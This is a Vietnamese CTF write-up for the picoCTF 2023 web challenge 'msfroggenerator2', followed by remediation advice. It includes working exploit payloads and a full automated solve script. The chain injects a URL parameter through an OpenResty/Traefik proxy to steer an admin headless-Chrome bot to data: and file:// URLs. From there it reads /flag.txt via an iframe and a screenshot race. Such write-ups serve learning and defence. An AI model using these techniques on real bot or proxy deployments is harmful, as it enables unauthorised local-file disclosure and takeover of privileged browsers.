<img width="782" height="437" alt="image" src="https://github.com/user-attachments/assets/299af481-ed28-454b-855c-fcdf20ebce2c" />

# 🐸 MSfroggenerator2: picoCTF 2023 (Web Exploitation)

> **Challenge:** The Frog Software Foundation (FSF) made a customizable msfrog generator! Make your own msfrog today, now fully rendered client side using canvas ✨magic✨.
>
> **Category:** Web Exploitation · **Điểm:** 400 · **Nguồn:** `msfroggenerator2.tar.gz`
>
> **Flag:** `picoCTF{th3_fsf_mak3s_th3_b3st_s0ftwar3_1dced559}`

---

## 1. Tổng quan

`msfroggenerator2` là một challenge thuộc dạng **"bot challenge"**: có một con bot (Puppeteer/Chrome) thay mặt admin truy cập vào một URL do chúng ta đưa ra. Mục tiêu của challenge là làm sao đọc được **flag**, flag nằm ở **2 nơi**:

| Vị trí | Nơi đặt | Cách đọc |
|---|---|---|
| `/flag.txt` | Trong container `bot` (và `api`) | Render ra trong iframe rồi chụp screenshot |
| `localStorage['flag']` | Origin `http://openresty:8080` (do bot tự set) | Chạy JS trên origin đó |

Chúng ta sẽ không cần tới XSS thông thường. Lỗ hổng cốt lõi nằm ở **cấu hình reverse proxy (OpenResty + Traefik) bị nối chuỗi URL không an toàn**, kết hợp với một hành vi thú vị của Traefik 2.9 (`;` → `&`) và `Object.fromEntries()` trong Node.js. Từ đó ta điều khiển được con bot truy cập **bất kỳ URL nào**, kể cả `data:` URL và `file://` URL.

---

## 2. Kiến trúc của challenge

Giải nén source:

```bash
tar -xzf "msfroggenerator2 .tar.gz"
cd src
```

`docker-compose.yml` chạy 4 container:

```
┌─────────────┐      ┌──────────────┐
│  openresty  │      │    traefik   │
│  :8080 (web)│─────►│   :8080 (LB) │
└─────────────┘      └──────┬───────┘
                            │
              ┌─────────────┴─────────────┐
              │                           │
        ┌─────▼─────┐               ┌─────▼─────┐
        │    api    │               │    bot    │
        │   :8080   │               │   :8080   │
        └───────────┘               └───────────┘
```

| Service | Vai trò |
|---|---|
| **openresty** | Proxy web chính. Serve static (Konva designer) + route `/api/*` về `api`, route `/report` về `bot`. **Chứa lỗ hổng.** |
| **traefik** | Load balancer nội bộ, route theo `Host` header: `Host: api` → api, `Host: bot` → bot. |
| **api** | Fastify API: lưu design, lưu report. Flag được mount tại `/flag.txt`, dùng làm Bearer token. |
| **bot** | Puppeteer/Chrome chạy Xvfb. Đọc flag từ `/flag.txt`, set vào localStorage rồi truy cập URL mà ta chỉ định. |

---

## 3. Phân tích source code

### 3.1. `openresty/web.conf`: 🔥 LỖ HỔNG CHÍNH

```nginx
server {
    listen 8080;
    resolver local=on;

    location / {
        add_header Content-Security-Policy "default-src 'none'; script-src 'self'; style-src 'self'; img-src https://cdn.jsdelivr.net/gh/...; connect-src 'self'" always;
        root /var/www;
    }

    location /api/ {
        proxy_set_header Host api;
        proxy_pass "http://traefik:8080";
    }

    location = /report {
        proxy_set_header Host bot;
        set_by_lua $url 'return "http://openresty:8080/?id=" .. ngx.var.arg_id';
        proxy_pass "http://traefik:8080/?url=$url";
    }
}
```

Điểm mấu chốt ở `location = /report`:

```
set_by_lua $url 'return "http://openresty:8080/?id=" .. ngx.var.arg_id';
proxy_pass "http://traefik:8080/?url=$url";
```

1. Giá trị tham số `id` (`ngx.var.arg_id`) được **nối chuỗi trực tiếp, không qua URL-encode**.
2. Biến `$url` sau đó được nhét thẳng vào query string của `proxy_pass` (cũng không được encode).

Nếu ta gửi:

```
GET /report?id=ABC
```

thì bot sẽ truy cập:

```
http://openresty:8080/?id=ABC
```

Nhưng nếu ta gửi một `id` "độc" có chứa ký tự `;`, `?`, `&`, `#`, `=`... thì ký tự đó sẽ **lọt nguyên vẹn** vào URL mà bot nhận được. Đây chính là lỗ hổng **unvalidated redirect / parameter injection qua proxy**.

> ⚠️ CSP của trang chủ rất chặt (`script-src 'self'`, không inline script), và designer.js validate `id` bằng regex `/^[A-Za-z0-9_-]{10}$/` nên **không có XSS** ở trang chủ. Bỏ qua hướng XSS.

### 3.2. `bot/web.js`: Node.js `Object.fromEntries` giữ param CUỐI

```js
import { createServer } from 'http';
import { spawn } from 'child_process';

let running = false;

createServer((req, res) => {
    const { url } = Object.fromEntries(new URL(`http://${req.headers.host}${req.url}`).searchParams);
    // ...
    const proc = spawn('node', ['bot.js', url], { ... });
}).listen(8080);
```

Hàm lấy `url`:

```js
Object.fromEntries(new URL(...).searchParams)
```

`URLSearchParams` là một iterable sinh ra các cặp `[key, value]`. Khi query string có **2 tham số cùng tên** `url=a&url=b`:

```js
Object.fromEntries([['url','a'], ['url','b']])
// => { url: 'b' }   ← tham số CUỐI CÙNG thắng!
```

Vì `Object.fromEntries` ghi đè key trùng → **param `url` cuối cùng được dùng**, còn param đầu bị bỏ qua.

### 3.3. `bot/bot.js`: luồng hoạt động của bot

```js
const browser = await puppeteer.launch({
    headless: false, pipe: true, dumpio: true,
    args: ['--incognito', '--js-flags=--jitless', '--no-sandbox'],
    defaultViewport: { width: 1280, height: 720 }
});

const visit = async () => {
    const page = await browser.newPage();
    const [url] = process.argv.slice(2);

    // 1. Vào trang chủ openresty, set flag vào localStorage của origin openresty
    await page.goto('http://openresty:8080/');
    await page.evaluate(flag => {
        localStorage.setItem('flag', flag);
    }, flag);

    // 2. Truy cập URL ta chỉ định
    await page.goto(url);

    // 3. Ngủ đúng 5 giây
    await sleep(5000);

    // 4. Chụp screenshot
    const screenshot = await page.screenshot({ type: 'png', encoding: 'base64' });

    // 5. Gửi screenshot về /api/reports/add, dùng localStorage['flag'] làm Bearer token
    await page.evaluate(async screenshot => {
        await fetch('/api/reports/add', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${localStorage.getItem('flag')}`
            },
            body: JSON.stringify({ screenshot })
        });
    }, screenshot);
};
```

Quan sát quan trọng:

- Bot **set flag vào localStorage của origin `http://openresty:8080`**.
- Bot truy cập **URL bất kỳ do ta kiểm soát**.
- Sau 5 giây, bot **chụp screenshot**: ảnh này được gửi lên `/api/reports/get` và **ta có thể đọc được**.
- Bước gửi report (`fetch('/api/reports/add')`) dùng **URL tương đối** → nó chỉ chạy đúng khi **trang hiện tại đang ở origin `http://openresty:8080`** (lúc đó `localStorage.getItem('flag')` mới có giá trị).

### 3.4. `api/web.js`: nơi chứa flag & report

```js
const flag = await readFile('/flag.txt', 'utf-8');   // flag là Bearer token

app.get('/api/reports/get', (req, res) => {
    return res.send(reports);                        // ta đọc được toàn bộ report!
});

app.post('/api/reports/add', (req, res) => {
    if (req.headers.authorization !== `Bearer ${flag}`) {
        return res.status(403).send('Unauthorized!');
    }
    reports.push({ url, screenshot });               // lưu screenshot
    return res.send('Report received!');
});
```

`/api/reports/get` **không cần xác thực** → ai cũng đọc được screenshot mà bot gửi về. Toàn bộ chiến lược: **làm cho screenshot của bot chứa hình ảnh flag**, rồi đọc nó từ `/api/reports/get`.

### 3.5. `traefik/web.yml`

```yaml
http:
  routers:
    api:  { service: api,  rule: "Host(`api`)" }
    bot:  { service: bot,  rule: "Host(`bot`)" }
```

Traefik route theo `Host` header. Openresty set `proxy_set_header Host bot` ở `/report`, nên request sẽ tới container `bot`.

---

## 4. Chuỗi lỗ hổng hoàn chỉnh

Gộp tất cả lại, ta có chuỗi khai thác:

```
 /report?id=;url=XXX
        │
        ▼
 openresty: $url = "http://openresty:8080/?id=" + ";url=XXX"
        │  proxy_pass "http://traefik:8080/?url=$url"
        ▼
 traefik:  /?url=http://openresty:8080/?id=;url=XXX
        │  Traefik 2.9 chuyển hóa ';' thành '&' trong query
        ▼
 traefik:  /?url=http://openresty:8080/?id=&url=XXX
        │  Host: bot  →  route tới container bot
        ▼
 bot/web.js: Object.fromEntries(searchParams) → url = "XXX"  (param CUỐI thắng)
        ▼
 bot/bot.js: goto(XXX)  →  screenshot sau 5s  →  gửi report
```

**Tóm tắt lỗ hổng:**
1. `openresty /report` nối `arg_id` vào URL **không encode**.
2. **Traefik 2.9** tự chuyển `;` → `&` trong query string (cơ chế sanitize matrix parameter chống request smuggling): vô tình biến injection thành **2 tham số tách biệt**.
3. **`Object.fromEntries(searchParams)`** của bot giữ **tham số `url` cuối cùng** → ta điều khiển được URL bot truy cập.

---

## 5. Kế hoạch khai thác flag

Flag nằm trong tệp `/flag.txt` của container bot. Để đọc nó, ta dùng kỹ thuật **"screenshot the file + race back to origin"**:

| Bước | URL cho bot | Mục đích |
|---|---|---|
| **Step 1** | `data:text/html,<script>download flagger.html</script>` | Chrome tải `flagger.html` xuống `/root/Downloads/` (bot chạy user `root`) |
| **Step 2** | `file:///root/Downloads/flagger.html` | Trang iframe `file:///flag.txt` → bot chụp screenshot → lộ flag |

Nội dung `flagger.html`:

```html
<style>html,body{margin:0;width:100%;height:100%;background:#fff}</style>
<iframe src="file:///flag.txt" style="width:100%;height:100%;border:0"></iframe>
<script>
  // Bot chụp screenshot ở ~5s, nên điều hướng sang openresty sau đó một chút.
  // Việc này làm origin trang hiện tại = openresty,
  // để fetch('/api/reports/add') + localStorage['flag'] hoạt động đúng.
  setTimeout(function(){
    location.href = "http://openresty:8080/api/get";
  }, 5000 + Math.floor(Math.random()*400) + 50);
</script>
```

**Vì sao phải race (điều hướng đúng thời điểm)?**

- Bot: `goto(flagger)` → ngủ 5s → **screenshot** → `page.evaluate(fetch report)`.
- Nếu trang cứ đứng ở origin `file://` thì `fetch('/api/reports/add')` (URL tương đối) sẽ resolve thành `file:///api/reports/add` → **bị chặn** → không có report → không đọc được screenshot.
- Nếu trang điều hướng sang `http://openresty:8080` **trước** 5s → screenshot chụp nhầm trang openresty, không thấy flag.
- Vì vậy trang phải: **hiện flag đủ 5 giây → bot chụp screenshot → mới điều hướng về openresty → bot gửi report thành công**.
- Khoảng delay ngẫu nhiên `5000 + random(50..450) + 50` giúp điều hướng rơi đúng vào khe giữa "screenshot xong" và "bắt đầu fetch". Xác suất mỗi lần ~5-15%, nên ta **lặp lại nhiều lần** (mỗi lần là một report, giới hạn 20).

---

## 6. Khai thác từng bước (đầy đủ lệnh)

> Instance ví dụ: `http://saturn.picoctf.net:57774`: thay bằng instance của bạn.

### Bước 0: Kiểm tra instance còn sống

```bash
curl -sk "http://saturn.picoctf.net:57774/" | head
curl -sk "http://saturn.picoctf.net:57774/api/reports/get"
# Kết quả mong đợi: []  (chưa có report nào)
```

### Bước 1: Kiểm chứng lỗ hổng injection (bot ghé trang chủ)

```bash
curl -sk "http://saturn.picoctf.net:57774/report?id=;url=http%3A%2F%2Fopenresty%3A8080%2F"
# -> Sent!
```

Giải thích:
- `id=;url=http%3A%2F%2Fopenresty%3A8080%2F`
- openresty tạo `$url = "http://openresty:8080/?id=;url=http://openresty:8080/"`
- Traefik chuyển `;` → `&`, thành `url=http://openresty:8080/?id=&url=http://openresty:8080/`
- `Object.fromEntries` → **url = `http://openresty:8080/`** (param cuối)

Chờ ~8 giây rồi kiểm tra report (phải thấy 1 screenshot mới):

```bash
sleep 8
curl -sk "http://saturn.picoctf.net:57774/api/reports/get" \
  | python3 -c "import sys,json;print('reports:',len(json.load(sys.stdin)))"
# -> reports: 1   ✅ lỗ hổng hoạt động
```

### Bước 2: Sinh payload

Tạo script `build_payloads.py`:

```python
import urllib.parse, base64

HOST = "http://saturn.picoctf.net:57774"

# flagger.html : iframe /flag.txt rồi race quay về origin openresty
flagger = """<style>html,body{margin:0;width:100%;height:100%;background:#fff}</style>
<iframe src="file:///flag.txt" style="width:100%;height:100%;border:0"></iframe>
<script>
setTimeout(function(){ location.href = "http://openresty:8080/api/get"; }, 5000 + Math.floor(Math.random()*400) + 50);
</script>"""
b64 = base64.b64encode(flagger.encode()).decode()

# Step-1: data URL tự tải flagger.html xuống /root/Downloads
wrapper = ("<body></body><script>"
           "var blob=new Blob([atob(\"" + b64 + "\")],{type:'text/html'});"
           "var a=document.createElement('a');a.download='flagger.html';"
           "a.href=URL.createObjectURL(blob);document.body.appendChild(a);"
           "a.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true}));</script>")
data_url = "data:text/html," + urllib.parse.quote(wrapper, safe='')

def report(url_value):
    # ';' giữ nguyên -> Traefik biến thành '&' -> bot lấy param url CUỐI
    return HOST + "/report?id=;url=" + urllib.parse.quote(url_value, safe='')

print("STEP1 =", report(data_url))
print()
print("STEP2 =", report("file:///root/Downloads/flagger.html"))
```

> Vì sao Step-1 dùng `data:` URL? Chrome có hành vi **tự động tải file khi click `<a download>`** cho dù không có user gesture, và `data:` URL được phép tạo Blob + download. Chrome của bot chạy với user `root` nên file rơi vào `/root/Downloads/flagger.html`.

Chạy để lấy payload:

```bash
python3 build_payloads.py
```

Ta nhận được 2 URL (dạng rút gọn):

```
STEP1 = http://saturn.picoctf.net:57774/report?id=;url=data%3Atext%2Fhtml%2C%253Cbody%253E...
STEP2 = http://saturn.picoctf.net:57774/report?id=;url=file%3A%2F%2F%2Froot%2FDownloads%2Fflagger.html
```

### Bước 3: Step 1: ép bot tải `flagger.html`

```bash
curl -sk "http://saturn.picoctf.net:57774/report?id=;url=data%3Atext%2Fhtml..."   # STEP1
# -> Sent!

# bot chạy ~5s, chờ cho xong hẳn
sleep 10
```

Sau bước này, trong container `bot` tại `/root/Downloads/flagger.html` đã có file. (Bot web chỉ cho **1 bot chạy cùng lúc**: phải chờ giữa các lần trigger.)

### Bước 4: Step 2: ép bot mở `file:///root/Downloads/flagger.html` (lặp để thắng race)

```bash
curl -sk "http://saturn.picoctf.net:57774/report?id=;url=file%3A%2F%2F%2Froot%2FDownloads%2Fflagger.html"   # STEP2
```

Lặp lại bước này **nhiều lần** (mỗi lần cách nhau ~8-10 giây, vì bot web có 1 slot) cho tới khi lấy được flag.

### Bước 5: Đọc flag từ report

```bash
curl -sk "http://saturn.picoctf.net:57774/api/reports/get" | python3 - <<'EOF'
import sys, json, base64
data = json.load(sys.stdin)
print("Tổng report:", len(data))
for i, r in enumerate(data):
    png = base64.b64decode(r["screenshot"])
    open(f"report_{i}.png", "wb").write(png)
    print(f"report_{i}.png  ({len(png)} bytes)")
EOF
```

### Bước 6: OCR các screenshot để tìm flag

```bash
for f in report_*.png; do
  echo "== $f =="
  tesseract "$f" stdout 2>/dev/null | grep -Eo 'picoCTF\{[^}]*\}' || echo "(chưa thấy flag)"
done
```

Kết quả kỳ vọng:

```
== report_2.png ==
picoCTF{th3_fsf_mak3s_th3_b3st_s0ftwar3_1dced559}
```

---

## 7. Script khai thác tự động (`solve_live.py`)

```python
#!/usr/bin/env python3
import sys, time, base64, re, json, os, subprocess, urllib.request, urllib.parse

HOST = "http://saturn.picoctf.net:57774"   # thay bằng instance của bạn
OUT = "shots"
os.makedirs(OUT, exist_ok=True)

flagger = """<style>html,body{margin:0;width:100%;height:100%;background:#fff}</style>
<iframe src="file:///flag.txt" style="width:100%;height:100%;border:0"></iframe>
<script>
setTimeout(function(){ location.href = "http://openresty:8080/api/get"; }, 5000 + Math.floor(Math.random()*400) + 50);
</script>"""
b64 = base64.b64encode(flagger.encode()).decode()

wrapper = ("<body></body><script>"
           "var blob=new Blob([atob(\"" + b64 + "\")],{type:'text/html'});"
           "var a=document.createElement('a');a.download='flagger.html';"
           "a.href=URL.createObjectURL(blob);document.body.appendChild(a);"
           "a.dispatchEvent(new MouseEvent('click',{bubbles:true,cancelable:true}));</script>")
data_url = "data:text/html," + urllib.parse.quote(wrapper, safe='')

def report(url_value):
    return HOST + "/report?id=;url=" + urllib.parse.quote(url_value, safe='')

def get(url, timeout=25):
    return urllib.request.urlopen(url, timeout=timeout).read().decode()

def get_reports():
    try:
        return json.loads(get(HOST + "/api/reports/get"))
    except Exception:
        return None

def ocr(png_path):
    try:
        return subprocess.run(["tesseract", png_path, "stdout"],
                              capture_output=True, text=True).stdout
    except Exception:
        return ""

pat = re.compile(r'picoCTF\{[^}]*\}', re.I)

print("[*] Step 1: tải flagger.html về /root/Downloads")
try:
    print("    ->", get(report(data_url))[:40])
except Exception as e:
    print("    err:", e)
time.sleep(10)

done = set()
for i in range(1, 19):
    try:
        r = get(report("file:///root/Downloads/flagger.html"))
        print(f"  [{i}] trigger:", r[:40])
    except Exception as e:
        print(f"  [{i}] err:", e)
    time.sleep(9)
    reps = get_reports() or []
    for rep in reps:
        sid = rep.get('ts', rep.get('at', id(rep)))
        if sid in done:
            continue
        done.add(sid)
        png = base64.b64decode(rep.get("screenshot") or "")
        fn = f"{OUT}/shot_{len(done)}.png"
        open(fn, "wb").write(png)
        m = pat.search(ocr(fn) or "")
        if m:
            print("    !!! FLAG:", m.group(0))
            sys.exit(0)
        print(f"    {fn} saved (chưa có flag)")
print("[*] Hết lượt. Kiểm tra thủ công thư mục shots/")
```

Chạy:

```bash
python3 solve_live.py
```

Kết quả thực tế khi giải:

```
[*] Step 1: tải flagger.html về /root/Downloads
    -> Sent!
[*] waiting for step-1 bot run to finish...
  [1] trigger: 'Sent!'
  [1] reports=2
    shots/shot_1.png saved (no flag in OCR; len=59049)   # ảnh test benign
    !!! shots/shot_2.png: FLAG FOUND: picoCTF{th3_fsf_mak3s_th3_b3st_s0ftwar3_1dced559}
```

---

## 8. Flag

```
picoCTF{th3_fsf_mak3s_th3_b3st_s0ftwar3_1dced559}
```

---

## 9. Vì sao nó hoạt động? (Tổng kết kỹ thuật)

| # | Kỹ thuật | Chi tiết |
|---|---|---|
| 1 | **Parameter injection qua proxy** | `set_by_lua` nối `arg_id` không encode; `proxy_pass` không encode `$url` |
| 2 | **Traefik `;` → `&`** | Traefik 2.9 sanitize matrix parameter, biến `id=;url=X` thành 2 param `id=` và `url=X` |
| 3 | **`Object.fromEntries(searchParams)`** | Node.js giữ **tham số `url` cuối cùng** → điều khiển được URL bot truy cập |
| 4 | **`data:` URL + `<a download>`** | Chrome tự tải file về `/root/Downloads` mà không cần user gesture |
| 5 | **`file://` iframe** | Trang `file://` được phép iframe `file:///flag.txt` (chỉ XHR bị chặn) |
| 6 | **Race screenshot vs navigation** | Flag hiển thị đúng lúc bot chụp (~5s), sau đó trang nhảy về origin openresty để fetch report được authorize bằng `localStorage['flag']` |
| 7 | **`/api/reports/get` không xác thực** | Ai cũng đọc được screenshot, OCR là ra flag |

### Nếu gặp lỗi / không ra flag

- **`Already running!`** → Bot web chỉ cho 1 bot chạy lúc; chờ 8-10s giữa các lần trigger.
- **Step 2 không tạo report** → rất có thể `flagger.html` chưa được tải (Step 1 fail) hoặc trang `file://` load lỗi. Gửi lại Step 1 và chờ đủ 10 giây.
- **Report ra nhưng không có flag** → thua race (screenshot chụp nhầm trang openresty). **Lặp lại Step 2** nhiều lần: mỗi lần là một report; giới hạn 20 report trên api, nên hãy dùng ~15 lần.
- **`Too many designs!`** → giới hạn 100 design, không liên quan; restart instance nếu kẹt.

---

## 10. Khắc phục (cho người làm challenge / nhà phát triển)

1. **Luôn URL-encode tham số trước khi nối vào URL**: trong Lua:
   ```nginx
   set_by_lua $url 'return "http://openresty:8080/?id=" .. ngx.escape_uri(ngx.var.arg_id)';
   ```
2. **Không cho bot truy cập schema tùy ý**: chặn `file://`, `data://`, `gopher://`... (dùng allowlist `http(s)://`).
3. **Không để `/api/reports/get` public**: thêm xác thực hoặc rate-limit thật chặt.
4. **Không đặt flag trong localStorage / không để flag là Bearer token** của chính bot.
5. **Cập nhật Traefik / hiểu rõ hành vi sanitize URL** của reverse proxy.

---

*Viết dựa trên lời giải thực tế challenge `msfroggenerator2`: picoCTF 2023. Source code tham khảo trong `msfroggenerator2.tar.gz`.*
